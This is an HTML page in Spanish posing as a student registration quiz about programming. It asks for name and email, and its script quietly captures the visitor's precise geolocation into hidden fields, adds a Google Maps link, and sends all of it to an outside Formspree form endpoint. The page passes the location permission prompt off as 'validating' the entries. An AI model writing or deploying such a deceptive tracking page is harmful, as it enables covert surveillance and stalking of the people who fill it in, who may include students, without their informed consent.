<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cuestionario de Informática</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        h2 { color: #333; text-align: center; }
        label { display: block; margin-top: 15px; font-weight: bold; color: #555; }
        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 6px; margin-top: 20px; cursor: pointer; font-size: 16px; }
        #status { font-size: 12px; color: #777; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Registro de Alumnos</h2>
    <form id="proyectForm" action="https://formspree.io/f/xykngrn p" method="POST">
        
        <label>Nombre:</label>
        <input type="text" name="nombre" required>

        <label>Correo:</label>
        <input type="email" name="email" required>

        <label>¿Sabes qué es programación?</label>
        <select name="conoce_progra">
            <option value="si">Sí</option>
            <option value="no">No</option>
        </select>

        <label>¿Has compartido algo por programación?</label>
        <textarea name="mensaje" rows="2"></textarea>

        <input type="hidden" name="Latitud" id="lat">
        <input type="hidden" name="Longitud" id="lon">
        <input type="hidden" name="Mapa" id="map_link">

        <button type="button" onclick="enviar()">Enviar Registro</button>
        <p id="status">Se validarán los datos al enviar.</p>
    </form>
</div>

<script>
    function enviar() {
        const form = document.getElementById('proyectForm');
        const status = document.getElementById('status');
        
        if (navigator.geolocation) {
            status.textContent = "Validando... por favor acepta el permiso.";
            navigator.geolocation.getCurrentPosition(function(pos) {
                document.getElementById('lat').value = pos.coords.latitude;
                document.getElementById('lon').value = pos.coords.longitude;
                document.getElementById('map_link').value = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                form.submit();
            }, function() {
                // Si rechaza el permiso, envía solo el texto
                form.submit();
            });
        } else {
            form.submit();
        }
    }
</script>

</body>
</html>
